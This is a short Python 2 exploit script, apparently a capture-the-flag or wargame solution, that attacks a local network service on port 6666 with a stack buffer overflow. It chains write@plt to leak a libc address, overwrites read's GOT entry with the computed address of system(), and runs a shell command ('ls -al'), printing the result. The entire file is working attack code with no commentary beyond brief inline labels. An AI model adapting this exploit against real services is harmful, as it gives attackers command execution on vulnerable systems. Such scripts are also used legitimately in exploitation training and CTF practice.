#!/usr/bin/python

from socket import *
from struct import *
from time import *

p = lambda x: pack("<L", x)
up = lambda x : unpack("<L", x)[0]

s = socket(AF_INET, SOCK_STREAM)
s.connect(('127.0.0.1', 6666))

read_plt = 0x804832C
read_got = 0x804961C
write_plt = 0x804830C
write_got = 0x8049614
pppr = 0x80484b6

dynamic_addr = 0x8049530
read_system_libc = 0x9abe0

cmd = 'ls -al'

print "[+]Exploit!"
payload = ''
payload += 'A' * 140
#Get target write libc address
payload += p(write_plt)
payload += p(pppr)
payload += p(0x1) #stdout
payload += p(read_got)
payload += p(0x4)
#write in dynamic section
payload += p(read_plt)
payload += p(pppr)
payload += p(0x0) #stdin
payload += p(dynamic_addr)
payload += p(len(cmd))
#got overwrite
payload += p(read_plt)
payload += p(pppr)
payload += p(0x0)
payload += p(read_got)
payload += p(0x4)
#system call
payload += p(read_plt)
payload += p(0x41414141)
payload += p(dynamic_addr)

s.send(payload)

#libc distance calc
read_libc = up(s.recv(4))
system_addr = read_libc - read_system_libc
print "System addr [*]" + hex(system_addr)

s.send(cmd)
s.send(p(system_addr))

print s.recv(1024)
print "Finish!"
